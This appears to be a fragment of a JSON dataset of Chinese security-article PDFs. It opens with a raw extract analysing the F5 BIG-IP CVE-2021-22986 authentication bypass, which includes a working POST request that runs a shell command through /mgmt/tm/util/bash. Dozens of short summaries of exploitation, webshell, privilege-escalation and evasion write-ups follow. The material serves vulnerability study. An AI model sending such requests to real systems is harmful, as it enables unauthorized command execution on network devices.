界⾯ https://172.16.113.247 即可使⽤ admin/ 刚刚设置的密码登陆 默认发送，会报 401, Server 为 Apache 给⼀个错误的 Authorization 认证头 ( 为 admin: 的 base64 值 ) ，依然会报 401, Server 为 Apache 去掉 Authorization 认证头，加⼀个 X-F5-Auth-Token 认证头，依然报 401 ，但是此时 Server 为 Jetty 漏洞复现然⽽，当两个头都存在的时候，认证会绕过并执⾏命令： 通过这⼏个包的测试我们可以得出结论，当存在 X-F5-Auth-Token 头时， apache 不检查 basic 认证头， jetty 在检查时，只检查 Authorization 的⽤户名不检查密码，但是为什么会这样呢，尝试分析 简单分析可以知道 443 是 httpd 开启的，其使⽤了 apache 2.4.6 框架 [ root@localhost:NO\tLICENSE:Standalone ] \t~\t #\tnetstat\t-antp\t|\tgrep\t:443 tcp6\t\t\t\t\t\t\t 0 \t\t\t\t\t\t 0 \t 127 .0.0.1:55220\t\t\t\t\t\t\t\t\t 127 .0.0.1:8100\t\t\t\t\t\t\t\t\t\tCLOSE_WAIT\t\t 28239 /httpd tcp6\t\t\t\t\t\t\t 0 \t\t\t\t\t\t 0 \t:::443\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t:::*\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tLISTEN\t\t\t\t\t\t 4795 /httpd [ root@localhost:NO\tLICENSE:Standalone ] \t~\t #\thttpd\t-v Server\tversion:\tBIG-IP\t 67 .el7.centos.5.0.0.12\t ( customized\tApache/2.4.6 ) \t ( CentOS ) Server\tbuilt:\t\t\tJun\t 23 \t 2020 \t 16 :37:41 进⼊ httpd 配置⽬录 /etc/httpd/ 分析 apache 认证绕过漏洞分析[ root@localhost:NO\tLICENSE:Standalone ] \thttpd\t #\tcd\t/etc/httpd/ [ root@localhost:NO\tLICENSE:Standalone ] \thttpd\t #\tgrep\t-r\t\"/mgmt\"\t./* Binary\tfile\t./modules/mod_f5_auth_cookie.so\tmatches Binary\tfile\t./modules/mod_auth_pam.so\tmatches ./run/config/httpd.conf:<ProxyMatch\t/mgmt/> ./run/config/httpd.conf:RewriteRule\t^/mgmt$\t/mgmt/\t [ PT ] ./run/config/httpd.conf:RewriteRule\t^/mgmt ( /vmchannel/.* ) \t $1 \t [ PT ] ./run/config/httpd.conf:ProxyPass\t/mgmt/\thttp://localhost:8100/mgmt/\t retry = 0 ./run/config/httpd.conf:ProxyPass\t/mgmt/job\t! ./run/config/httpd.conf:ProxyPass\t/mgmt/endpoint\t! ./run/config/httpd.conf:ProxyPass\t/mgmt/\thttp://localhost:8100/mgmt/\t retry = 0 可以了解到请求 /mgmt/ 相关 url 开启了 AuthPAM_Enabled ，启⽤ auth 会调⽤ /usr/lib/httpd/modules/mod_auth_pam.so 判断鉴权，尝 试逆向 /usr/lib/httpd/modules/mod_auth_pam.so ⽂件 IDA 中，将汇编统⼀解析为 intel ⻛格 ,mov dst source 参考 Apache Hook 机制解析（上） —— 钩⼦机制实现 apache 的 mod_auth_pam.so 发现int\tpam_register_hooks() { \t\tap_hook_check_authz(sub_5AF0,\t0,\t0,\t20,\t1); \t\treturn\tap_hook_check_access_ex(sub_5AF0,\t0,\t0,\t20,\t1); } 认证检查的具体代码都在 sub_5AF0 当中 这个函数很⼤，⽽且由于不知名原因不能反编译拿到伪代码，但是可以找到 \"X-F5-Auth-Token\" 的调⽤： 由于代码量较⼤，看起来⽐较累，计划结合动态调试搞清楚逻辑， 由于 apache 默认的话会开启⼦进程来处理，调试进程这个有点麻烦，为了⽅便调试搞清楚 apache 认证绕过过程，以单线程的⽅式 重启 httpd ， /usr/sbin/httpd\t-DTrafficShield\t-DAVRUI\t-DWebAccelerator\t-DSAM\t-X 通过查看指定进程号下的 maps ⽂件，即可知道 mod_auth_pam.so 的加载基地址 [root@localhost:NO\tLICENSE:Standalone]\tconfig\t#\tcat\t/proc/$(ps\t-ef\t|grep\t\"/usr/sbin/httpd\t-D\"\t|\tgrep\t-v\t\"grep\"\t|\tawk\t'{print\t$2}')/maps\t|\tgrep\tmod_auth_pam.so\t|\tgrep\tr-xp 563aa000-563b7000\tr-xp\t00000000\tfd:06\t168436\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t/usr/lib/httpd/modules/mod_auth_pam.so 在 mod_auth_pam.so 的 loc_72D0 地址处下断点，即 hex(0x563aa000+0x72d0)=0x563b12d0 (gdb)\tb\t*0x563b12d0 Breakpoint\t1\tat\t0x563b12d0 然后发送数据包 ( 注意，这个数据包⾥⾯是没有 X-F5-Auth-Token 的 ) POST\t/mgmt/tm/util/bash\tHTTP/1.1 Host:\t172.16.113.247 Authorization:\tBasic\tYWRtaW46 Connection:\tclose Content-type:\tapplication/json Content-Length:\t41 {\"command\":\"run\",\t\"utilCmdArgs\":\t\"-c\tid\"}继续调试，当运⾏⾄ 0x563b12ee( 即 test  eax, eax)",
        "FileName": "11417-F5 BIGIP CVE-2021-22986认证绕过漏洞分析.pdf"
    },
    {
        "page_content": ".htaccess 文件是一种配置文件，允许用户在特定目录及其子目录中修改 Apache Web 服务器的行为。它支持各种指令，包括 SetHandler、AddHandler 和 AddType，这些指令可以用于强制处理文件、建立文件扩展名与处理器之间的映射以及将文件扩展名映射到指定的内容类型。此外，.htaccess 文件还可以用于实现重定向、自定义错误页面、更改文件扩展名、允许或阻止对特定用户或目录的访问以及配置默认文档。",
        "FileName": "8267-Apache的.htaccess利用技巧.pdf"
    },
    {
        "page_content": "该文档主要介绍了 AMF 网站的渗透测试，包括 AMF 的简介、测试工具、实战案例和结语。通过利用 AMF 反序列化和编码工具，渗透测试人员可以获取敏感用户信息、执行 SQL 注入、检测未授权访问和文件删除漏洞，从而深入探索 AMF 网站的潜在安全风险。",
        "FileName": "8399-谈谈AMF网站的渗透测试.pdf"
    },
    {
        "page_content": "该文档详细描述了从 Linux 系统渗透到域控的过程，涉及信息收集、权限维持、域内渗透和密码窃取等技术。渗透者通过利用 S2 漏洞、上传木马、扫描域环境、导出注册表、利用 MS17-010 和 MS14-068 漏洞、注入票据、建立 IPC 连接、收集主机信息和查看 SPN 等手段，最终成功控制了域控并窃取了大量密码。",
        "FileName": "12193-记一次从linux打进域控.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-9484 漏洞，该漏洞是 Apache Tomcat 中的一个反序列化漏洞，允许攻击者通过上传恶意序列化对象来执行任意代码。文档详细介绍了漏洞的利用条件、复现步骤和利用方法，包括如何配置 Tomcat、创建恶意会话文件以及触发反序列化。",
        "FileName": "7803-CVE-2020-9484 tomcat session反序列化漏洞分析.pdf"
    },
    {
        "page_content": "**主题：** 文件包含漏洞\n\n**内容：** 文件包含漏洞是一种攻击者利用包含函数包含恶意代码的漏洞。根据配置环境，文件包含漏洞分为本地文件包含漏洞和远程文件包含漏洞。本地文件包含漏洞仅能包含服务器本地文件，而远程文件包含漏洞则能包含远程文件，攻击者可利用此漏洞执行恶意操作。为了防止文件包含漏洞，应避免让前端用户直接向包含函数传递变量，并对变量进行严格的白名单策略过滤。",
        "FileName": "12002-Pikachu靶场-File Inclusion.pdf"
    },
    {
        "page_content": "该文档包含一系列网络安全挑战，涉及各种技术，包括文件分析、命令执行、JavaScript解密和弱密码破解。通过解决这些挑战，用户可以获得一系列flag，这些flag可以组合成最终的flag：Cyberpeace{786OsErtk12}。",
        "FileName": "12183-攻防世界1.新手练习区.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 D 盾 DLL 劫持漏洞来实现权限维持和钓鱼攻击。通过劫持或替换程序运行时调用的 DLL，攻击者可以欺骗程序加载恶意 DLL，从而获得对系统的控制。文档提供了详细的步骤，包括检测劫持漏洞的方法、利用开源工具进行检测以及使用自定义 DLL 实现 CS 上线。该漏洞已提交至 CNVD，文档强调仅用于技术讨论，不应用于非法途径。",
        "FileName": "8419-D盾dll劫持利用.pdf"
    },
    {
        "page_content": "该文档主要介绍了对 ThinkPHP 5.0.5 二次开发代码的审计，发现了 SQL 注入漏洞和 RCE 漏洞。审计过程包括目录扫描、代码分析和构造攻击载荷，并提供了相关参考链接。",
        "FileName": "8428-一次简单的实战—TP二次开发代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 Fastbin Attack 漏洞，该漏洞利用堆溢出和 UAF 等漏洞，通过劫持 fastbin 链表中的 chunk 的 fd 指针，将目标内存分配到指定地址，从而实现任意地址写任意值的效果。",
        "FileName": "7490-Fastbin Attack 学习.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何从外到内渗透一个三层网络域，包括利用 Laravel RCE 漏洞获取 WebShell、利用 Docker runC 漏洞逃逸、利用 Redis 未授权 RCE 拿下 DMZ 权限、利用通达 OA 漏洞获取内网 OA getshell、利用 kiwi 模块抓取域用户密码、利用永恒之蓝进攻其他 PC 机、利用 psexec 登陆域控制器、利用 sc 远程创建服务关闭防火墙等技术，最终拿下所有目标靶机（5 台）的最高权限。",
        "FileName": "10204-记一次进修从外到内的打法.pdf"
    },
    {
        "page_content": "该文档详细描述了作者从发现 Shiro 框架漏洞到成功渗透内网的全过程，包括指纹识别、利用工具碰撞密钥、获取系统权限、导出密码和远程桌面连接等步骤，展示了作者对 Shiro 漏洞的深入理解和渗透测试的熟练技巧。",
        "FileName": "11201-记一次从shiro-550到内网渗透的全过程.pdf"
    },
    {
        "page_content": "该文档主要介绍了 TemplatesImpl 利用链及其在 Java 安全中的应用，包括利用链的组成、原理、代码示例和利用方法，以及如何通过 Fastjson 注⼊内存马。",
        "FileName": "12085-TemplatesImpl利用链与Fastjson注入内存马.pdf"
    },
    {
        "page_content": "该文档记录了一次获取 Webshell 的过程，通过分析网站源代码和 JavaScript 文件，发现了一个文件上传接口，构造上传数据包后成功上传 Webshell。然而，作者发现其他攻击者已在更早时间获取了 Webshell。文档强调了未经授权测试的违法性，并建议仅用于学习交流。",
        "FileName": "9412-记一次 getshell 过程.pdf"
    },
    {
        "page_content": "RASP（运行时应用程序自我保护）是一种安全防护措施，它在功能调用前或调用时获取访问当前方法的参数等信息，根据这些信息来判定是否安全。与传统的安全防护措施相比，RASP 误报率低、保护全面性强，但存在性能损耗和部署成本高的问题。",
        "FileName": "12536-RASP简单实现.pdf"
    },
    {
        "page_content": "该文档是一份关于权限提升的备忘录，其中概述了在 Windows 和 Linux 系统中利用各种漏洞和技术来提升权限的方法，包括 UAC 提权、内核溢出、定时任务提权、SUID 提权、sudo 权限绕过、UDF 提权、MOF 提权和 SQL Server xp_cmdshell 提权。",
        "FileName": "7573-权限提升备忘录.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-40097 漏洞，该漏洞是一个经过身份验证的路径遍历到远程代码执行 (RCE) 漏洞，影响 Concrete CMS。攻击者可以通过上传包含 PHP 代码的图像文件，然后通过路径穿越技术包含该文件来利用此漏洞。文档详细介绍了漏洞的利用过程，包括设置 bFilename 参数、更新数据库中的文件路径以及渲染执行过程。",
        "FileName": "11248-CVE-2021-40097 concrete cms rce.pdf"
    },
    {
        "page_content": "该文档分析了 Microsoft Exchange Server 中的一个逻辑远程代码执行漏洞，该漏洞需要在触发前进行中间人 (MiTM) 攻击。该漏洞存在于 Exchange Server 的 UpdatableHelp 组件中，允许未经身份验证的攻击者通过 MiTM 攻击触发远程代码执行，从而在 Exchange 服务器上以 SYSTEM 权限执行任意代码。",
        "FileName": "10163-Exchange Server 中间人劫持 RCE 漏洞分析.pdf"
    },
    {
        "page_content": "CVE-2019-18634 漏洞是一个 sudo 提权漏洞，影响 sudo 版本为 [1.7.1,1.8.31) 。该漏洞允许攻击者利用一个栈溢出漏洞（实际上溢出点在 bss 段）来获取 root 权限。该漏洞的危害较大，因为 pwfeedback 配置选项在多数的 Linux 系统中都不是默认选项，但是在 Linux Mint 和 Elementary OS 上是默认开启的。",
        "FileName": "7622-CVE-2019-18634漏洞复现与分析.pdf"
    },
    {
        "page_content": "该文档介绍了 Nunjucks 模板引擎，包括其语法、内置过滤器和全局函数。它还讨论了如何利用 Nunjucks 的全局函数来突破沙箱限制并执行任意代码，并提供了绕过 Web 应用程序防火墙 (WAF) 的示例 payload。",
        "FileName": "12264-从一道题目学习Nunjucks模板.pdf"
    },
    {
        "page_content": "该文档介绍了 .NET 中的 NetDataContractSerializer，它用于序列化和反序列化 Windows Communication Foundation (WCF) 消息中的数据。它与 DataContractSerializer 类似，但包含 CLR 类型信息，因此只能在序列化和反序列化端使用相同的 CLR 类型。文档还讨论了 NetDataContractSerializer 的攻击链，例如 PSObject，并提供了利用该攻击链的示例代码。",
        "FileName": "9600-.net反序列化之NetDataContractSerializer.pdf"
    },
    {
        "page_content": "CVE-2020-11800 漏洞影响 Zabbix Server 的 trapper 命令处理，导致远程代码执行。该漏洞源于 IP 校验绕过，允许攻击者通过自动注册添加主机并执行命令，从而在服务器上执行任意代码。",
        "FileName": "8991-CVE-2020-11800 zabbix RCE漏洞细节披露.pdf"
    },
    {
        "page_content": "该文档提供了有关域信息枚举的详细指南，包括使用 Active Directory 模块和 powerview 两种方法。它涵盖了从基本域信息到域组、域用户、域策略、ACL 和信任关系等关键信息的枚举，为域内横向移动和域控制器提权提供必要的信息支持。",
        "FileName": "7724-域信息枚举.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过路由器管理台中的命令执行漏洞，该漏洞存在于网络ping测试中。通过利用fuzz技术，可以发现被过滤的字符，并使用%0a注入新的命令。由于docker没有bash或python程序，因此使用了一种折中的方法，通过请求一个bash文件到tmp目录，并赋予其权限，最终执行该文件来获取flag。",
        "FileName": "12224-CTFer成长之路之命令执行漏洞.pdf"
    },
    {
        "page_content": "**主题：**利用 TLS 协议进行服务器端请求伪造 (SSRF) 攻击。\n\n**内容：**该文档介绍了一种利用 TLS 协议进行 SSRF 攻击的新方法，该方法利用了 TLS 会话复用机制和 DNS 重绑定攻击。攻击者可以通过修改恶意 TLS 服务器上的会话 ID，在客户端第二次请求时将目标 IP 地址更改为本地 IP 地址，从而攻击客户端本地的服务。文档还提供了利用该方法进行攻击的详细步骤和配置示例。",
        "FileName": "9177-BlackHat2020 议题 「When TLS Hacks You」 复现.pdf"
    },
    {
        "page_content": "该文档介绍了影响 Jackson-databind 库的三个 CVE 漏洞，这些漏洞允许攻击者通过启用 enableDefaultTyping() 功能并使用特定的第三方依赖项来执行 JNDI 注入攻击。这些漏洞影响了 Jackson-databind 的多个版本，建议及时升级到安全版本或采取其他缓解措施，例如升级到较新版本的 JDK。",
        "FileName": "8012-Jackson-databind的几个CVE.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Resin 应用程序服务器中动态注册内存 Webshell，包括 Filter、Servlet 和 Listen 等方法。它详细描述了如何获取上下文中对象、添加 Filter 映射和 Servlet 映射，并提供了 POC 代码示例。",
        "FileName": "11758-Resin内存马逆袭之路.pdf"
    },
    {
        "page_content": "该文档介绍了如何改造 CommonsCollections12 gadget 以实现更强大的功能，包括代码注入、延迟注入、shell 反弹和原始命令执行。通过反射使用 javax.script.ScriptEngineManager，该改造允许用户执行复杂命令，即使在没有 powershell 的情况下也是如此。",
        "FileName": "8673-CommonsCollections12之CommonsCollections6改造计划.pdf"
    },
    {
        "page_content": "本文介绍了一种利用 Poller 内存马实现全流量监控的技术，该技术通过在 Poller 类中重写 processKey 方法，在 web 业务处理之前和之后添加自定义处理逻辑，从而可以实时监控经过系统的每个请求，并通过 WebSocket 将流量数据传输到外部监听器。",
        "FileName": "11655-给木马带双眼睛.pdf"
    },
    {
        "page_content": "该文档分析了 Google Voice 扩展程序中基于 DOM 的 XSS 漏洞，该漏洞允许攻击者通过在 accounts.google.com 上触发特定消息来执行任意 JavaScript 代码。该漏洞是由 Google Ads 客户 ID 与美国电话号码格式相同而偶然发现的，并通过 Google Voice 扩展程序中的 Wg() 函数触发，该函数在 body 元素中查找电话号码并创建包含电话号码的 span 元素，从而允许攻击者注入恶意代码。",
        "FileName": "7898-Bug Bounty通过Google Voice扩展程序在accounts.google.com上触发基于DOM的XSS。.pdf"
    },
    {
        "page_content": "该文档详细描述了如何利用 SQL 注入漏洞在目标系统上获得远程 shell 访问权限。攻击者使用 SQLmap 识别注入点，然后使用 msfvenom 生成一个恶意可执行文件，该文件通过 certutil.exe 下载到目标系统。攻击者使用监听模块和 Windows payload 设置 msf，成功接收 shell 并查看系统补丁。通过使用神站检测漏洞并从 GitHub 获取 EXP，攻击者能够提权并添加帐户，最终获得对远程服务器的完全访问权限。",
        "FileName": "8183-一处SQL引发的血案.pdf"
    },
    {
        "page_content": "该文档探讨了 ThinkPHP5.0 反序列化链中使用 base64 编码绕过文件名的技术，并介绍了利用 Memcached 驱动中的 set 函数控制文件名，最终实现写入可控文件。",
        "FileName": "7310-关于 ThinkPHP5.0 反序列化链的扩展.pdf"
    },
    {
        "page_content": "本文档介绍了跨站脚本攻击（XSS）的主题和内容。XSS 是一种常见的 Web 安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。本文档介绍了 XSS 的原理、分类、绕过姿势和攻击对象，并提供了示例代码和绕过方法。",
        "FileName": "12370-对于XSS跨站脚本攻击的学习.pdf"
    },
    {
        "page_content": "本文档分享了挖掘通用型漏洞的思路和方法，包括前期准备、代码扫描、漏洞发现和验证、组合漏洞扩大成果等步骤。作者建议初学者从简单的 CMS 开始挖掘，并使用代码审计、黑盒测试和灰盒测试相结合的方式进行漏洞挖掘。",
        "FileName": "10539-某次通用型漏洞挖掘思路分享.pdf"
    },
    {
        "page_content": "该文档探讨了如何绕过反病毒软件对 certutil 指令的检测，以实现免杀下载。通过尝试不同的参数组合、添加无关参数、利用特殊字符和修改程序版本信息，作者最终成功绕过了火绒和 360 反病毒软件的检测，实现了免杀下载。",
        "FileName": "12760-免杀学习-从指令绕过开始(2).pdf"
    },
    {
        "page_content": "**主题：** SnakeYaml 反序列化漏洞分析\n\n**内容：** SnakeYaml 是 Java 中用于解析 YAML 格式数据的库，其反序列化过程存在漏洞，可导致远程代码执行。漏洞利用涉及通过 YAML 字符串注入恶意类，该类实现 ScriptEngineFactory 接口并在静态代码块中执行命令。此外，文档还介绍了 Java 中的 SPI 机制，该机制允许通过配置文件动态加载服务实现。",
        "FileName": "9934-SnakeYaml反序列化.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Windows 系统提权的各种方法，包括内核溢出漏洞提权、信息收集、UAC 提权、令牌窃取、系统配置错误提权、PowerUp、组策略首选项提权等，并提供了相应的工具和模块，详细阐述了每种方法的原理和操作步骤。",
        "FileName": "12542-关于Windows提权小结.pdf"
    },
    {
        "page_content": "该文档记录了一次对不存在的 ecshop 网站的渗透测试，通过利用 RCE 漏洞，攻击者获得了对服务器的控制权，并通过报错注入和字符串切割函数获取了管理员密码，最终通过创建恶意 PHP 文件并上传，成功在服务器上建立了反向 shell。",
        "FileName": "8444-记一次不存在的ecshop实战渗透.pdf"
    },
    {
        "page_content": "该文档详细描述了利用 PostgreSQL 数据库漏洞的过程，包括获取数据库信息、执行系统命令和上传恶意脚本。由于该网站采用前后端分离架构，直接写入 Webshell 没有意义，因此作者使用隐藏命令回显的批处理脚本上传并执行恶意可执行文件，最终成功上线。",
        "FileName": "10202-记一次pgsql数据库漏洞利用.pdf"
    },
    {
        "page_content": "该文档分析了 Dedecms 内容管理系统中存在的多个漏洞，包括前台任意用户密码修改、前台文件上传、会员模块身份认证和后台写配置文件过滤不足导致的 getshell 漏洞。文档详细介绍了漏洞成因、代码分析和漏洞复现步骤，为理解和修复这些漏洞提供了有价值的信息。",
        "FileName": "9705-dedecms漏洞总结.pdf"
    },
    {
        "page_content": "本文档对 KKCMS 代码审计进行了分析和总结。审计使用 Seay+ 和昆仑镜工具，发现了多个漏洞，包括验证码重用、XSS、可控参数、登录后台后发现的广告管理界面 XSS 等。审计还发现，虽然开头引用的 inc.php 文件包含了 SQL 注入防护函数，但由于某些参数未被单引号或双引号包裹，导致防护无效，存在 SQL 注入漏洞。",
        "FileName": "11714-记一次较为详细的某CMS代码审计.pdf"
    },
    {
        "page_content": "本文探讨了 PowerShell 免杀技术，包括无文件攻击、DNS 隧道、绕过杀毒软件和 PowerShell 脚本混淆。它提供了详细的步骤和示例，展示了如何使用 PowerShell 在不触发安全警报的情况下执行恶意代码。",
        "FileName": "7903-Powershell免杀的探索.pdf"
    },
    {
        "page_content": "Empire 是一款开源、跨平台的远程管理和后渗透开发框架，本文介绍了 Empire 的基本功能、常用模块用途以及渗透中的案例研究，涵盖了监听、生成反弹 shell 的 payload、管理反弹 shell 的会话、权限提升、横向移动、信息收集、数据窃取、持久化、后门、漏洞利用、态势感知等方面。",
        "FileName": "7071-Empire的进攻性研究.pdf"
    },
    {
        "page_content": "CVE-2022-0847-DirtyPipe 漏洞利用 Linux 内核中 pipe 缓冲区处理的缺陷，通过修改 page cache 覆盖任意文件内容，但由于修改后的 page 未被标记为脏页，因此不会被写回磁盘，重启后文件内容将恢复。",
        "FileName": "11038-CVE-2022-0847-DirtyPipe分析.pdf"
    },
    {
        "page_content": "本文介绍了 Terraform 的使用，包括如何使用 Terraform 在腾讯云上创建 COS 存储桶。Terraform 是一种资源编排工具，可以通过它方便地构建云服务资源。本文详细介绍了 Terraform 的安装、配置、代码编写和执行过程，并展示了如何使用 Terraform 获取 COS、CVM 和 CAM 的相关信息。此外，文章还讨论了 Terraform 在云上攻防中的作用，例如利用 Terraform 打造全云场景覆盖的 AK、SK 利用工具进行信息收集。",
        "FileName": "11440-Terraform 使用入门以及在云上攻防中的作用.pdf"
    },
    {
        "page_content": "本文分析了 mimikatz 抓取密码的原理，并从防御角度探讨了如何防止 mimikatz 抓取密码。文章介绍了调试权限、WDigest、凭证缓存、受保护用户组和受限管理员模式等概念，并提供了相应的防御措施。",
        "FileName": "9722-从mimikatz抓取密码学习攻防.pdf"
    },
    {
        "page_content": "**主题：**渗透测试练习\n\n**内容：**该文档详细描述了一次渗透测试练习，其中攻击者使用各种技术（如Nmap扫描、信息收集、PHPMyAdmin利用、Yxcms利用）在目标机器上获取shell访问权限。然后，攻击者尝试提权，但未能成功。最后，攻击者使用系统漏洞提权，成功提升到system权限。",
        "FileName": "8523-记一次简单的渗透练习.pdf"
    },
    {
        "page_content": "该文档分析了 zzzcms php 版 v1.7.5 的安全漏洞，包括前台 SQL 注入、SSRF、后台地址泄露和后台 RCE，并提供了利用这些漏洞的有效载荷和绕过方法。",
        "FileName": "7414-zzzcms(php) v1.7.5 前台SQL注入及其他.pdf"
    },
    {
        "page_content": "该文档分析了 Proxynotshell 反序列化漏洞 (CVE-2023-21707)，该漏洞允许攻击者通过反序列化恶意 XML 数据来执行任意代码。文档详细介绍了漏洞的原理，包括如何利用 LanguagePrimitives.ConvertTo 方法和 BinaryFormatter 反序列化来实现代码执行。",
        "FileName": "12634-Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons JXPath 组件中的 CVE-2022-41852 漏洞，该漏洞允许攻击者通过提供不可信的 XPath 表达式来执行任意代码。文档详细介绍了利用该漏洞的三个方法，包括创建对象、调用静态方法和调用普通方法，并提供了利用代码示例和调用栈分析。",
        "FileName": "11769-CVE-2022-41852 Apache Commons Jxpath 漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了一种通过挂钩 Windows ALPC 内核来拦截 ALPC 通信的方法。该方法利用了 ALPC_PORT 对象的 IO 回调功能，通过设置 IOCompleteCallback 来实现挂钩。挂钩后，可以获取到 ALPC 通信的信息，包括发送和接收进程的 ID、服务名称等，从而实现对 ALPC 通信的监控和分析。",
        "FileName": "10706-windows ALPC内核拦截的方法.pdf"
    },
    {
        "page_content": "本文介绍了在大型活动中进行常规攻击的思路，通过案例分析，强调了基础攻击手法的重要性，并展示了如何通过百度、企查查、子域名爆破、目录爆破、SQL注入等手段收集资产信息，以及如何利用万能密码和上传漏洞进行渗透。",
        "FileName": "9754-”传统艺能“与实战的结合 系列文章（二）某次大型活动中的常规思路.pdf"
    },
    {
        "page_content": "该文档分析了 TP5.0.x 框架中的两个漏洞：请求类中变量覆盖导致的 RCE 和路由控制不严谨导致的任意类调用导致的 RCE。它还提供了利用反序列化链来利用 TP5.0.24 中的漏洞的详细步骤。",
        "FileName": "8143-TP5.0.xRCE&5.0.24反序列化分析.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何通过分析学校网站的 HTML 源代码、寻找相同程序的弱口令和利用 0day 漏洞，成功绕过奇安信 WAF 并获取学校大屏幕管理系统的 webshell。作者还分享了绕过 WAF 的技巧，即使用大量垃圾字符来消耗 WAF 的内存，从而绕过内容检测。",
        "FileName": "7786-实战渗透-看我如何拿下自己学校的大屏幕(Bypass).pdf"
    },
    {
        "page_content": "该文档重点介绍了 Python 中的各种安全问题，包括 input() 函数的潜在安全隐患、assert 语句的滥用、浮点数比较的复杂性、私有属性的隐藏、模块注入、Monkey patching、对象类型更改、shell 注入、临时文件的不当使用、不安全的反序列化、模板引擎中的代码注入等。",
        "FileName": "7582-python中的一些安全问题.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 PHPCMS9.6 任意文件上传漏洞的代码审计过程，通过分析正常注册流程和 POC 提交过程，揭示了漏洞的成因和利用方式。审计者强调了理解漏洞原理和挖掘者思路的重要性，并分享了代码审计的学习方法和心得。",
        "FileName": "12003-对一次PHPCMS9.6任意文件上传的代码审计学习.pdf"
    },
    {
        "page_content": "本文深入分析了 CVE-2015-4852、CVE-2016-0638 和 CVE-2016-3510 这三个 Weblogic 反序列化漏洞，从 Weblogic 处理流量中序列化数据的流程入手，详细阐述了漏洞产生的原因、修复过程以及绕过修复的方法。通过对漏洞原理的深入理解，文章揭示了 Weblogic 反序列化漏洞的本质，即利用了 Weblogic 反序列化机制，而官方在修复 CVE-2015-4852 时仅增加了黑名单，并未对机制进行调整。",
        "FileName": "8443-从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何绕过 WAF（Web 应用程序防火墙）并利用某 985 大学系统的漏洞，包括利用弱口令、任意文件上传、绕过限制执行命令、通过 Redis 主从复制反弹 root 权限 shell，以及使用各种技术绕过 WAF 对文件后缀、内容和函数的检测。",
        "FileName": "7855-看我如何绕过waf，拿下某985(母校)某系统.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用友友NC v6.5中的反序列化漏洞进行回显攻击。攻击者可以通过利用org.mozilla.javascript.DefiningClassLoader类中的defineClass方法加载恶意类字节码，从而绕过JDK安全过滤并实现回显。利用过程包括编译恶意类、将恶意类转换为字节码、修改CommonsCollections6中的transformers构造，并反射调用defineClass方法加载字节码。",
        "FileName": "8414-用友nc v6.5 反序列化回显绕过.pdf"
    },
    {
        "page_content": "该文档介绍了如何解决使用 Docker Hub 时拉取镜像速度慢的问题。它建议使用国内的 Docker Hub 镜像服务器，并提供了修改 `/etc/docker/daemon.json` 配置文件以使用这些服务器的步骤。通过修改配置并重启 Docker 服务，用户可以提高拉取镜像的速度。",
        "FileName": "12764-解决kali docker拉取镜像慢的问题.pdf"
    },
    {
        "page_content": "Spring Cloud Config 2.2.3 之前的 2.2.x 版本、2.1.9 之前的 2.1.x 版本以及较旧版本存在目录遍历漏洞 (CVE-2020-5410)，允许恶意用户通过特制 URL 发送请求，导致目录遍历攻击。该漏洞的触发点在 EnvironmentController 中，通过拼接环境变量、参数和路径，绕过对路径的检测，从而获取任意配置文件。",
        "FileName": "7877-CVE-2020-5410 Spring Cloud Config目录穿越漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了使用 Frida 框架在 Android 应用程序中进行 Hook 操作，包括 Hook 有导出函数和无导出函数的 so 文件中的 native 层代码。文档提供了 Hook 导出函数和无导出函数的基本框架，并通过案例演示了如何使用 Interceptor 拦截器进行 Hook 操作，包括 Hook so 文件中的 Java_com_testjava_jack_pingan2_cyberpeace_CheckString 方法和 Java_com_ifeng_daemon_facade_NativeSecureparam_readMD5Key 方法，以及使用无导出函数 Hook so 文件中的 Java_com_tencent_tencent2016a_MainActivity_NativeCheckRegister 方法。",
        "FileName": "12088-安卓编写常见的hook技巧（2）.pdf"
    },
    {
        "page_content": "该文档提供了分步指南，介绍如何通过利用 XSS 漏洞通关一系列挑战。它详细介绍了每一步的有效载荷和技术，包括闭合标签、修改 HTML 属性、构造 POST 数据包、绕过 HTML 实体编码和使用 JavaScript 伪链接。该指南还强调了在某些情况下需要使用特定浏览器或编码格式。",
        "FileName": "12112-XSS Challenges通关教程.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Beans RCE 漏洞，该漏洞是由参数绑定功能中的变量覆盖造成的。攻击者可以通过构造恶意请求获取 AccessLogValve 对象并注入恶意字段值，触发管道机制，从而写入任意路径下的文件。该漏洞影响 Spring MVC 框架的所有版本，并且在 JDK 9 及更高版本中存在。官方补丁通过过滤危险属性来修复该漏洞，例如 classLoader 和 protectionDomain。",
        "FileName": "11129-Spring Beans RCE分析.pdf"
    },
    {
        "page_content": "Cream Finance 协议遭黑客闪电攻击，攻击者利用杠杆借款和兑换操作获取大量 cySUSD 资产，从而借出多个数字资产获利。该事件凸显了 DeFi 项目面临的漏洞攻击风险，建议项目在上线前进行全面安全审计、发布漏洞赏金计划和加强安全监测和预警。",
        "FileName": "9263-零时科技  Cream Finance协议遭黑客闪电攻击事件分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种通过修改 Java 过滤器来注入恶意代码的持久化内存马技术，该技术利用 Java 提供的 JarFile API 修改 jar 包中的关键类文件，从而在不停止服务器的情况下注入恶意代码，并详细介绍了实现过程和代码示例。",
        "FileName": "10582-java filter马持久化.pdf"
    },
    {
